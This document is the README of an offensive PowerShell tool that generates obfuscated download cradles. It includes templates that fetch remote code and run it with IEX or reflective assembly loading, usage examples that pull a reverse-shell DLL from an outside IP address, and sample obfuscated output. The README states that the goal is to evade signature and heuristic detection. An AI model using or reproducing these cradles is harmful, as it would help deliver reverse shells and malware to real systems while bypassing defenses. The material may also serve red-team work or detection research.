# Obfuscated PowerShell Download Cradles

Get-DownloadCradle is a project that stems from the Invoke-PSObfuscation framework, with the sole purpose of producing obfuscated download cradles for PowerShell. With the way this framework is built, each component of the original payload goes through a randomly selected generator, resulting in a different yield with every execution of this script. 

Due to the complexity of the obfuscation logic, the resulting payloads will be very difficult to signature and will slip past heuristic engines that are not programmed to emulate the inherited logic.

## Cradle Templates

This script includes templates for three PowerShell download cradles, namely `DownloadString`, `DownloadFile` and `DownloadData`. The resulting payloads are output as a one liner, but have been split below for readability. 

__DownloadString__

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadString("<DOWNLOADPATH>") | IEX
```
__DownloadFile__

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("<DOWNLOADPATH>","<LOCALPATH>")
$Assem = [System.Reflection.Assembly]::LoadFile("<LOCALPATH>")
$Class = $Assem.GetType("<CLASSNAME>")
$Method = $Class.GetMethod("<METHODNAME>")
$Method.Invoke(0,$null)
```

__DownloadData__

```powershell
$WebClient = New-Object System.Net.WebClient
$Data = $WebClient.DownloadData("<DOWNLOADPATH>")
$Assem = [System.Reflection.Assembly]::Load($Data)
$Class = $Assem.GetType("<CLASSNAME>")
$Method = $Class.GetMethod("<METHODNAME>")
$Method.Invoke(0,$null)
```

## Requirements

This script was built and tested on the following version Kali Linux and PowerShell. The obfuscated cradles are compatible on Windows systems that support PowerShell newer than version 2.0

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      7.2.4
PSEdition                      Core
GitCommitId                    7.2.4
OS                             Linux 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07)
Platform                       Unix
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
WSManStackVersion              3.0
```

## Usage Examples

To load the script on Kali Linux, open a terminal then run `pwsh`. With PowerShell now running in your terminal, you can load the script into your current session by dot sourcing the script.

```shell
┌──(kali㉿kali)-[~]
└─$ pwsh
PowerShell 7.2.4
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

┌──(kali㉿kali)-[/home/kali]
└─PS> . ./Get-DownloadCradle.ps1
```

With the script loaded into our PowerShell session, we need to run the `Get-DownloadCradle` function and supply the cradle type and accompanying information to inject into the payload.

__DownloadString__

`Get-DownloadCradle -DownloadString -DownloadPath http://192.168.49.80/rev.ps1`

__DownloadFile__

`Get-DownloadCradle -DownloadFile -DownloadPath http://192.168.49.80/rev.dll -LocalPath C:\rev.dll -Class DLL_Payload.ReverseShell -Method runner`

__DownloadData__

`Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner`

__Output to File__

`Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner -OutFile obfuscated.ps1`

__Show Changes__

Where this script has been built from `Invoke-PSObfuscation`, we have the ability to target specific script components vs all of them at the same time. In addition to this, if we wanted to learn more about what was obfuscated, we can include the `ShowChanges` parameter. This will instruct the script to display each targeted component, the obfuscated value that will be replacing it and the generator value that was used. 

```shell
──(kali㉿kali)-[/home/kali]
└─PS> Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner -ShowChanges

     >> Layer 0 Download Cradle
     >> https://github.com/gh0x0st

    Generator 2 >> http://192.168.49.80/rev.dll >> $([char](51+104-51)+[char](0+116-0)+[char](0+116-0)+[char](0+112-0)+[char](30+58-30)+[char](0+47-0)+[char](73*47/73)+[char](25*49/25)+[char](45+57-45)+[char](58+50-58)+[char](102+46-102)+[char](0+49-0)+[char](78*54/78)+[char](113*56/113)+[char](26*46/26)+[char](18*52/18)+[char](69*57/69)+[char](98*46/98)+[char](15*56/15)+[char](24*48/24)+[char](0+47-0)+[char](48+114-48)+[char](118*101/118)+[char](0+118-0)+[char](0+46-0)+[char](0+100-0)+[char](45*108/45)+[char](0+108-0))
    Generator 3 >> DLL_Payload.ReverseShell >> $($($('D'+'L'+'L'+'_'+'P'+'a'+'y'+'l'+'o'+'a'+'d'+'.'+'R'+'e'+'v'+'e'+'r'+'s'+'e'+'S'+'h'+'e'+'l'+'l')))
    Generator 3 >> runner >> ($($('r'+'u'+'n'+'n'+'e'+'r')))
    Generator 2 >> System.Net.WebClient >> $([char](0+83-0)+[char](76+121-76)+[char](118+115-118)+[char](98+116-98)+[char](91*101/91)+[char](2*109/2)+[char](105*46/105)+[char](0+78-0)+[char](51*101/51)+[char](0+116-0)+[char](23+46-23)+[char](0+87-0)+[char](0+101-0)+[char](0+98-0)+[char](111+67-111)+[char](54*108/54)+[char](0+105-0)+[char](52+101-52)+[char](42*110/42)+[char](0+116-0))
    Generator 2 >> New-Object >> & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_})
    Generator 5 >> | >> |<##>%{$_}|
    Generator 11 >> | >> |ForEach-Object{$_}|ForEach-Object{$_}|
    Generator 2 >> $WebClient >> $rOG6V9jBlcgSL3DnfKy1vs
    Generator 3 >> $Data >> $MH6VTazWPsQbu8z
    Generator 3 >> $Assem >> $SIsYjqGeX8bayA2nuPRC
    Generator 3 >> $Class >> $fD
    Generator 2 >> $Method >> $5osQqa0YTMZIUt6Vu9D
```
